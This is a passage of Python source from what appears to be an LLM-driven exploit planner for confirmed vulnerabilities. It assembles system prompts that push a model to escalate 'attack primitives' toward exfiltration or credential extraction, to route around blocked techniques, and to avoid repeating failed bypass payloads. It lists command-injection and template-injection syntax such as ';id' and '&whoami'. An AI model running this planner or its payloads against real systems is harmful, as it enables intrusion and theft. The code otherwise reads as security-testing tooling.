    lines.append("  3. 如果某个禁止项是本轮成功的关键，你必须设计全新的替代方案")
    lines.append("  4. 若前序步骤（如获取 token）本身未完成，严禁构造依赖它的后续步骤")
    lines.append("")

    # Also extract bypass-level failures from patterns
    pattern_patch = memory_patch.get("pattern", {})
    failed_patterns = pattern_patch.get("add_patterns", [])
    if failed_patterns:
        lines.append("【已证伪的 bypass 模式】:")
        for fp in failed_patterns:
            fp_id = fp.get("id", "?")
            fp_type = fp.get("type", "?")
            fp_payload = fp.get("payload", "")
            fp_desc = fp.get("description", "")
            lines.append(f"  ❌ [{fp_type}] {fp_desc}: {fp_payload}")

    lines.append("")
    lines.append("╚══════════════════════════════════════════════════════════════╝")

    return "\n".join(lines)


def _build_trajectory_context(traj: ExploitTrajectoryMemory) -> str:
    """Dehydrated trajectory state — compact ~400 char high-density dict (Task 3)."""
    if not traj.nodes:
        return ""

    ds = traj.get_dehydrated_state()
    chain = traj.get_current_chain()
    current_state = traj.get_current_state()
    current_primitive = traj.get_current_primitive()

    # Build as compact JSON block (no verbose ASCII art)
    compact = {
        "rounds": len(traj.nodes),
        "state": current_state,
        "chain": chain[-4:],
        "primitive": current_primitive or "",
        "attempted_endpoints": ds["attempted_endpoints"],
        "working_primitives": ds["working_primitives"],
        "blocked_patterns": ds["blocked_patterns"],
        "network_reachable": ds["network_reachable"],
    }
    return json.dumps(compact, ensure_ascii=False, separators=(",", ":"))


def _build_primitive_context(confirmed: dict[str, Any]) -> str:
    """构建 primitive-driven reasoning 上下文注入块。
    这是系统的核心升级：Planner 不再思考 payload，而是思考 primitive。"""
    registry = get_primitive_registry()
    learning = get_learning_engine()
    graph = get_transition_graph()
    traj = get_trajectory()

    cwe_ids = [v.get("cwe_id", "") for v in confirmed.get("vulnerabilities", []) if v.get("cwe_id")]

    lines: list[str] = []
    lines.append("╔══════════════════════════════════════════════════════════════╗")
    lines.append("║  🧬 PRIMITIVE-DRIVEN REASONING — 攻击原语认知推理层        ║")
    lines.append("╚══════════════════════════════════════════════════════════════╝")
    lines.append("")
    lines.append("【⚡ 核心范式转换 — 你必须遵循！】")
    lines.append("")
    lines.append("  旧范式（禁止）：payload A 失败 → payload B → payload C（随机漫游）")
    lines.append("  新范式（必须）：")
    lines.append("    1. 先问：当前 primitive 是什么？")
    lines.append("    2. 再问：primitive 下一阶段是什么？（查 transition graph）")
    lines.append("    3. 最后：哪个 payload 能实例化该 primitive？（从 primitive 的 payload_templates 选）")
    lines.append("")
    lines.append("  payload 只是 primitive 的实例化 —— primitive 才是攻击的本质。")
    lines.append("  你不能直接思考 '下一个 payload 是什么'，你只能思考 'primitive 如何升级'。")
    lines.append("")

    # Entry primitives based on CWE
    entry_primitives = graph.get_entry_primitives(cwe_ids)
    active_primitives = traj.get_primitive_chain()
    current_primitive = traj.get_current_primitive()

    if entry_primitives and not active_primitives:
        lines.append(f"── 🚪 推荐入口 Primitive（基于 CWE {', '.join(cwe_ids[:3])}）──")
        for pid in entry_primitives:
            p = registry.get(pid)
            if p:
                lines.append(f"  ▸ {pid}: {p.description}")
                if p.payload_templates:
                    lines.append(f"    实例化示例: {p.payload_templates[0]}")
        lines.append("")

    # Current state vs primitive context
    if current_primitive:
        lines.append(f"── 🎯 当前 Primitive: {current_primitive} ──")
        # Next upgrade targets
        next_prims = graph.get_next_primitives(current_primitive)
        if next_prims:
            lines.append("  🔼 推荐升级目标（优先选择）：")
            for np_id in next_prims:
                p = registry.get(np_id)
                cond = graph.get_transition_condition(current_primitive, np_id)
                if p:
                    lines.append(f"    → {np_id}: {p.description[:100]}")
                    lines.append(f"      条件: {cond}")
                    if p.payload_templates:
                        lines.append(f"      实例化: {p.payload_templates[0]}")
        else:
            lines.append("  （已到达该链顶端，考虑 OOB exfiltration 或 credential extraction）")
        lines.append("")

    # Primitive transition graph
    graph_lines = graph.build_planner_context(active_primitives if active_primitives else None)
    # We already rendered the graph info inline above, so just add transition rules
    lines.append("")
    lines.append("【Primitive 升级规则 — 必须遵守！】")
    lines.append("  1. 每轮至少尝试一次 primitive 升级（沿 graph 中边向前推进）")
    lines.append("  2. 如果升级失败：记录失败原因（哪个 precondition 未满足）→ 调整 precondition")
    lines.append("  3. 不要在同级 primitive 上反复尝试不同 payload —— 那是随机漫游")
    lines.append("  4. 不要退回已确认的 primitive —— 只能前进，不能回退")
    lines.append("  5. payload 选择：先确定目标 primitive → 查其 payload_templates → 选择合适的实例")

    # Cross-target generalization hint
    lines.append("")
    lines.append("【Cross-Target Generalization — 跨目标迁移】")
    lines.append("  同一个 primitive 在不同引擎/框架中有不同的 payload 语法，但本质相同：")
    lines.append("    template_expression_execution: jinja2={{...}}, freemarker=${...}, thymeleaf=#{...}, ejs=<%=...%>")
    lines.append("    command_separator_injection: unix=;id, windows=&whoami, powershell=;Get-ChildItem")
    lines.append("  当遇到新目标时：1) 判断引擎/框架 2) 查找对应语法 3) 从 primitive 实例化")
    lines.append("  不要重新发明 payload——只需做语法适配。")

    # Learned primitives
    learned_ctx = learning.build_planner_context()
    if "尚未学习到" not in learned_ctx:
        lines.append("")
        lines.append(learned_ctx)

    lines.append("")
    lines.append("╚══════════════════════════════════════════════════════════════╝")

    return "\n".join(lines)


def run_planner(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None,
    out_path: Path,
    llm: DeepSeekClient | None,
    adapter: ChallengeAdapter | None = None,
) -> dict[str, Any]:
    if settings.mock_llm or llm is None:
        plan = _mock_plan(confirmed, memory)
        if feedback:
            plan["prior_feedback"] = feedback
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    vuln_summary = confirmed.get("title", "") or confirmed.get("description", "") or ""

    # 🔑 RAG 检索：按 CWE + 漏洞描述 + 上轮报错精准匹配三层记忆
    memory_context = _build_memory_context(memory, confirmed, feedback)

    user = {
        "confirmed_vuln": confirmed,
        "layered_memory": json.loads(memory.planning_context()),
        "retrieved_experience": memory_context,
        "prior_feedback": feedback,
        "last_execution_raw": (feedback or {}).get("last_execution_raw", {}),
    }

    core_logic = _extract_user_goal_dense(confirmed, adapter=adapter)

    if core_logic.startswith("【严重配置错误】"):
        print(f"[planner] ⚠️ {core_logic}")
        plan = {
            "version": 1,
            "plan_id": "plan_config_error",
            "vuln_summary": "CONFIG_ERROR",
            "rationale": core_logic,
            "steps": [],
            "error": "config",
            "platform": platform.system(),
        }
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    # ═══════════════════════════════════════════════════════════════════
    # Tasks 3+4: Strict Physical Memory Budgeting + Attention Routing
    #
    # 六层注意力拓扑图（位置 1-6，严格不可重排）：
    #   [L1 头部] Runtime Manifest — 最高指导原则
    #   [L2]     Hard Constraints & Banned Imports
    #   [L3]     SDK API Contract
    #   [L4]     Verified Facts & Memory Context
    #   [L5]     Dehydrated Trajectory State (compact JSON)
    #   [L6 尾部] User Goal — 裁剪后的攻击目标摘要
    #
    # 每一层由 MEMORY_BUDGET 物理硬截断；
    # 最终 total payload 由 _FINAL_PAYLOAD_HARD_CAP 再次双保险切片。
    # ═══════════════════════════════════════════════════════════════════

    # ── L1: Runtime Manifest (absolute head — zero hallucination) ──
    l1 = _apply_memory_budget("runtime_constraints", _build_runtime_manifest_block())

    # ── L2: Hard Constraints (bans + forbidden techniques blacklist) ──
    l2 = _build_hard_constraints_block()
    if feedback:
        forbidden_block = _build_forbidden_techniques_block(feedback)
        if forbidden_block:
            l2 = forbidden_block + "\n\n" + l2
            print(f"[planner] 失败指纹黑名单已合并到 L2 硬约束")
    l2 = _apply_memory_budget("hard_constraints", l2)

    # ── L3: SDK API Contract ──
    l3 = _apply_memory_budget("sdk_contract", _build_sdk_contract_block())

    # ── L4: Verified Facts (primitive context + verification + memory) ──
    l4_parts: list[str] = []

    primitive_context = _build_primitive_context(confirmed)
    if primitive_context:
        l4_parts.append(_physical_truncate(primitive_context, 500))

    verif = get_verification()
    verif_context = verif.build_planner_context()
    if verif_context and verif.get_stats()["facts_count"] > 0:
        l4_parts.append(_physical_truncate(verif_context, 300))

    if memory_context:
        l4_parts.append(_physical_truncate(memory_context, 400))

    l4 = _apply_memory_budget("verified_facts", "\n\n".join(l4_parts)) if l4_parts else ""

    # ── L5: Trajectory State (dehydrated compact JSON, ~300 char budget) ──
    traj = get_trajectory()
    traj_context = _build_trajectory_context(traj)
    l5 = _apply_memory_budget("trajectory_state", traj_context) if traj_context else ""

    # ── L6: User Goal (absolute tail — dense extract, ~2500 char budget) ──
    l6 = _apply_memory_budget("user_goal", core_logic)

    # Strict order assembly: L1→L2→L3→L4→L5→L6
    system_prompt_with_memory = "\n\n".join(
        p for p in [l1, l2, l3, l4, l5, l6] if p
    )

    # ── 双保险：物理硬截断到 _FINAL_PAYLOAD_HARD_CAP ──
    if len(system_prompt_with_memory) > _FINAL_PAYLOAD_HARD_CAP:
        system_prompt_with_memory = _physical_truncate(system_prompt_with_memory, _FINAL_PAYLOAD_HARD_CAP)
        print(f"[planner] ⚠️ 双保险触发！total > {_FINAL_PAYLOAD_HARD_CAP}，已强制物理截断")

    print(
        f"[planner] 内存预算: L1={len(l1)} L2={len(l2)} L3={len(l3)} "
        f"L4={len(l4)} L5={len(l5)} L6={len(l6)} total={len(system_prompt_with_memory)}"
    )

    if feedback:
        fb_planner = feedback.get("feedback_for_planner", "")
        fb_summary = feedback.get("summary", "")
        fb_confidence = feedback.get("confidence", 0)
        fb_success = feedback.get("repro_success", False)
        fb_errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
        fb_parts = [
            f"confidence={fb_confidence} | repro_success={fb_success}",
        ]
        # 🔑 攻击状态机字段 — 最高优先级展示，Planner 必须据此决定本轮策略
        fb_state = feedback.get("current_exploit_state", "")
        fb_milestones = feedback.get("milestones_achieved", [])
        fb_blocker = feedback.get("state_transition_blocker", "")
        fb_next_action = feedback.get("next_required_action", "")
        if fb_state:
            fb_parts.append(f"当前攻击状态: {fb_state}")
        if fb_milestones:
            fb_parts.append(f"已达成里程碑: {'; '.join(fb_milestones[:3])}")
        if fb_blocker:
            fb_parts.append(f"状态阻塞点: {fb_blocker}")
        if fb_next_action:
            fb_parts.append(f"下一步: {fb_next_action}")
        if fb_summary:
            fb_parts.append(f"summary: {fb_summary[:200]}")
        if fb_planner:
            fb_parts.append(f"feedback: {fb_planner[:500]}")
        if fb_errors:
            fb_parts.append(f"errors: {'; '.join(str(e)[:100] for e in fb_errors[:3])}")

        # 🔑 前轮 history_state 注入：强制 Planner 感知已尝试的 payload 历史
        prior_history = feedback.get("prior_history_state")
        if prior_history and isinstance(prior_history, dict):
            tried = prior_history.get("tried_payloads", [])
            failed = prior_history.get("failed_reasons", [])
            cat_fails = prior_history.get("consecutive_failures_per_category", {})
            history_lines = []
            if tried:
                history_lines.append(f"  已尝试Payload（严禁重复!）: {', '.join(tried[:5])}")
            if failed:
                history_lines.append(f"  历史失败原因: {'; '.join(failed[:3])}")
            if cat_fails:
                cat_str = ", ".join(f"{k}={v}次" for k, v in cat_fails.items())
                history_lines.append(f"  分类失败计数: {cat_str}")
                over_threshold = [k for k, v in cat_fails.items() if v >= 3]
                if over_threshold:
                    history_lines.append(
                        f"  以下路径已达失败上限，强制切换: {', '.join(over_threshold)}"
                    )
            if history_lines:
                fb_parts.append("history_state:\n" + "\n".join(history_lines))

        # 注入上一轮原始执行输出（严格裁剪）
        last_exec_raw = (feedback or {}).get("last_execution_raw", {})
        raw_steps = last_exec_raw.get("steps", [])
        if raw_steps:
            raw_lines = []
            raw_lines.append("【上一轮执行输出 trace】")
            for s in raw_steps[:3]:  # 最多 3 步，每步数据严格裁剪
                sid = s.get("step_id", "?")
                ok = s.get("ok", False)
                ec = s.get("exit_code", 0)
                st = s.get("stdout_tail", "")[:200]
                se = s.get("stderr_tail", "")[:200]
                exc = s.get("exception_snippet", "")[:200]
                raw_lines.append(f"  step[{sid}] {'OK' if ok else 'FAIL'} (exit={ec}): stdout={st} stderr={se}")
                if exc:
                    raw_lines.append(f"    exception={exc}")
                http_resps = s.get("http_responses", [])
                for h in http_resps[:1]:  # 仅第一条 HTTP 响应
                    raw_lines.append(
                        f"    HTTP {h.get('status_code')} {h.get('method')} "
                        f"{h.get('url', '')}: {(h.get('response_body', '') or '')[:150]}"
                    )
            system_prompt_with_memory += "\n" + _physical_truncate("\n".join(raw_lines), 600)

        system_prompt_with_memory += _physical_truncate(
            "\n\n【上一轮执行反馈 — 必须阅读并修正！】\n"
            + "\n".join(f"  • {p}" for p in fb_parts)
            + "\n\n请根据以上反馈修正攻击计划。必须优先考虑当前攻击状态和状态转换阻塞点。",
            800,
        )

    # ── 最终双保险：所有内容拼接完毕后再次物理硬截断 ──
    if len(system_prompt_with_memory) > _FINAL_PAYLOAD_HARD_CAP:
        system_prompt_with_memory = _physical_truncate(system_prompt_with_memory, _FINAL_PAYLOAD_HARD_CAP)
        print(f"[planner] ⚠️ 最终双保险触发！total > {_FINAL_PAYLOAD_HARD_CAP}，已强制物理截断")

    print(
        f"[planner] 最终 payload: total={len(system_prompt_with_memory)} chars "
        f"(L1={len(l1)} L2={len(l2)} L3={len(l3)} L4={len(l4)} L5={len(l5)} L6={len(l6)})"
    )

    plan = llm.complete_json(
        system_prompt_with_memory,
        json.dumps(user, ensure_ascii=False),
    )
    plan.setdefault("version", 1)
    plan["platform"] = platform.system()

    # Task 6: Extract structured AST metadata from each step
    plan = _extract_plan_ast(plan)

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
    return plan
